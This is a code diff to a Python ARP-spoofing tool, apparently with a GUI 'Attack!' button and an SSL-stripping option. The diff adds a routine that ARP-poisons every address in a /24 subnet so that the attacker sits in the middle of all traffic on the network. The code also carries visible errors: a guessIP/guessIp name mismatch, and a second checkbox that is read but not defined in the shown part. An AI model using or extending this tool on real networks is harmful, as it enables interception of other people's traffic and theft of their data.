@@ -30,6 +30,8 @@ RouterIP = '192.168.2.254' #GUI variable, gateway, evt automatisch
 targetIp = TargetIP
 hostIp = RouterIP #host = router
 includeSSL = False
+guessIP = '10.0.123.'
+silent = True
 
 choice1 = sg.Checkbox("SSL Stripping", default=False)
 t1 = sg.Input('', enable_events=True, key='-INPUT-', font=('Arial Bold', 20), justification='left')
@@ -75,6 +77,14 @@ def spoof(targetIp, hostIp, attackerIp):
     arp2[ARP].pdst = hostIp
 
     sendp(arp2, iface="enp0s10")
+    
+def full_spoof(targetIP, hostIP, attackerIP):
+    #loop trough every ip that could be on your network and be the MITM on all of them
+    for x in range(0, 255):
+        y = str(x)
+        targetIP = targetIP + y
+        spoof(targetIP, hostIP, attackerIP)
+        targetIP = guessIP
         
         
 def end_spoof(targetIp, hostIp, attackerIp):
@@ -157,7 +167,10 @@ def ARPLoop():
     
         while True:
         
-            spoof(targetIp, hostIp, attackerIp)
+            if silent == False:
+                full_spoof(guessIp, hostIp, attackerIp)
+            else:
+                spoof(targetIp, hostIp, attackerIp)
             time.sleep(2)
             
     except KeyboardInterrupt:
@@ -173,6 +186,7 @@ while True:
     event, values = window.read()
     if event == "Attack!" or event == None:
         includeSSL = values[0]
+        silent = values[1]
         TargetIP = layout[3][0].get()
         RouterIP = layout[5][0].get()
         targetIp = TargetIP
